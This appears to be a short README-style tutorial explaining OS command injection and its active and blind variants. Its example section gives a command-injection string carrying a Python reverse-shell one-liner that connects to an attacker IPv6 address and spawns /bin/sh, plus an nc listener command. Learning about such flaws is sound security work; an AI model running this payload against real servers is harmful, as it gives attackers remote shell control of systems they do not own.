 #                                           Web-Vulnerabilites

### OS Command Injection :

### What is OS Command Injection ?


OS Command Injection is server side  web vulnerablities where attacker execute " system command"  like id, whoami ,unamem etc os command  .
It is a web vulnerability that allows an attacker to take advantage of that made system call to execute operating system commands on the server.


### Types Of OS Commnad Injection :

                                  There are two types of OS command injection  such as :
                                                                           
                                                                                        i. Active OS command injection
                                
                                                                                        ii. Blind OS command injection

### Active OS Command Injection :


Active command injection will return the response to the user.  It can be made visible through several HTML elements. That means when a attacker execute " system command "  like ls ,server will return result of ls .(Attacker will se the result of ls ) .It is so easy to execute . 


### Blind OS Command Injection :
      
Blind command injection occurs when the system command made to the server does not return the response to the user in the HTML document . That means when a  attacker execute " system command "  like ls ,server will not return result of ls but  server execute ls command . For  , seening the result of  "system command " you must upload reverse shell on target / victim server . After ,uploaded  reverse shell on victim server , you must be  listen uploades shell on attacker terminal using nc command . 


### Example :
         
         1. upload reverse shell :
                                  ; python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'

        2. listen reverse shell :

                                 nc -lnvp 4242

Note : 
           
       1. Change ip according your local host ip
        
       2. One can easily  upload shell if OS command injection is occured .
              
